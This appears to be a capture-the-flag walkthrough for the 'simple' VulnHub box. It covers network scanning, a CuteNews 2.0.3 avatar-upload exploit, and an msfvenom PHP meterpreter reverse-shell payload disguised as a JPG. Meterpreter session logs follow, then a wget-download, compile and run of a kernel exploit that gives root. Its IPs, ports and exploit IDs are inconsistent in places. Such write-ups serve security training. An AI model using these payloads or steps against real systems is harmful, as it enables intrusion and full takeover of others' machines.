
    Service enumeration
    Check for vulnerabilities
    Exploitation
    Privilege Escalation
    Read Flag in /root

Breaching Methodology:

    Network Scanning (Netdiscover, Nmap)
    Enumerate File upload vulnerability (searchsploit)
    Generate PHP Backdoor (Msfvenom)
    Upload and execute a backdoor
    Reverse connection (Metasploit)
    Import python one-liner for proper TTY shell
    Kernel Privilege Escalation
    Get Root access and capture the flag.



## Step 1 - Recon
> netdiscover  
##### to discover the ip address of VM

## Step 2 - Recon advanced ports and Services
> nmap 
>
>nmap [nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.56.101]
>
>nikto [nikto -h 192.168.56.101]

## [step 3] Directory
> directory buster [dirb  192.168.156.101]
>
> nikto [nikto -h 192.168.56.101]

#### Then after opening the ip in browser I got a sign-in page and register page.Register in page.
>On scanning, you will find that port 80 is open which will be pointing toward cutenews. So we will now open it on our browser.
>Now we can see that our target is using CuteNews v.2.0.3 and the good news is it is exploitable, so let’s search for its exploit:
>
>searchsploit cutenews 2.0.3 [exploit-db-link](https://www.exploit-db.com/exploits/37474)
>
>Upon searching for the exploit we can see that we have the path for the exploit. Follow the path and go to the exploit’s “.txt” file. In the text file you find the instructions to upload the file. First thing it tells us to register on the website in order to have the power to upload a file.
>
>upload php file of jpg file generated by msfvenom in avatar.
>
>root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.126.202 LPORT=1234 -a php --platform php -o backdoor.jpg
>
>then start the msfconsole>meterpreter.

so its a Ubuntu box running 14.04.2 And we also got kernel version.So let's find its vulnrerability in exploit-db.

There were a few and after trying some of them and not having any success I got to this one

https://www.exploit-db.com/exploits/37292/

Lets navigate to the tmp folder and try to download the exploit.

download the file and execute it, we'll get a root #  then execute to open /bin/bash
>
>awk 'BEGIN {system("/bin/bash")}'
>
>root$~ ls /root/flag.txt

```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.43.70
lhost => 192.168.43.70
msf exploit(multi/handler) > set lport 9898
lport => 9898
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.43.70:9898 
[*] Sending stage (37775 bytes) to 192.168.43.70
[*] Meterpreter session 1 opened (192.168.43.70:9898 -> 192.168.43.70:50812) at 2019-01-16 23:04:51 +0530

meterpreter > sysinfo
Computer    : simple
OS          : Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686
Meterpreter : php/linux
meterpreter > shell
Process 1511 created.
Channel 0 created.

awk 'BEGIN {system("/bin/bash")}'

python -c 'import pty ; pty.spawn("/bin/bash")'
www-data@simple:/var/www/html/uploads$ uname -a
uname -a
Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
www-data@simple:/var/www/html/uploads$ cat /etc/lsb-release
cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.2 LTS"
www-data@simple:/var/www/html/uploads$ awk 'BEGIN {system("/bin/bash")}'
awk 'BEGIN {system("/bin/bash")}'
www-data@simple:/var/www/html/uploads$ wget https://www.exploit-db.com/download/36746 -O app.c
<ml/uploads$ wget https://www.exploit-db.com/downloa                      d/36746 -O app.c
--2019-01-16 12:42:34--  https://www.exploit-db.com/download/36746
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8, 64:ff9b::c07c:f908
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5216 (5.1K) [application/txt]
Saving to: 'app.c'

 0% [                                       ] 0           --.-K/s         100%[======================================>] 5,216       --.-K/s   in 0s      

2019-01-16 12:42:36 (2.49 MB/s) - 'app.c' saved [5216/5216]

www-data@simple:/var/www/html/uploads$ gcc app.c -o app -static
gcc app.c -o app -static
app.c:17:3: warning: #warning this file must be compiled with -static [-Wcpp]
 # warning this file must be compiled with -static
   ^
www-data@simple:/var/www/html/uploads$ ./app
./app
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
# awk 'BEGIN {system("/bin/bash")}'
awk 'BEGIN {system("/bin/bash")}'
root@simple:/var/www/html/uploads# ls
ls
app  app.c  avatar_tikam_shell.php
root@simple:/var/www/html/uploads# ls -la
ls -la
total 752
drwxrwxrwx 2 root     root       4096 Jan 16 12:42 .
drwxrwxrwx 7 root     root       4096 Sep 10  2015 ..
-rwsr-xr-x 1 root     root     746987 Jan 16 12:42 app
-rw-r--r-- 1 www-data www-data   5216 Jan 16 12:42 app.c
-rw-r--r-- 1 www-data www-data   1114 Jan 16 12:17 avatar_tikam_shell.php
root@simple:/var/www/html/uploads# ls /root
ls /root
flag.txt
root@simple:/var/www/html/uploads# cat /root/flag.txt
cat /root/flag.txt
U wyn teh Interwebs!!1eleven11!!1!
Hack the planet!
root@simple:/var/www/html/uploads# 

```
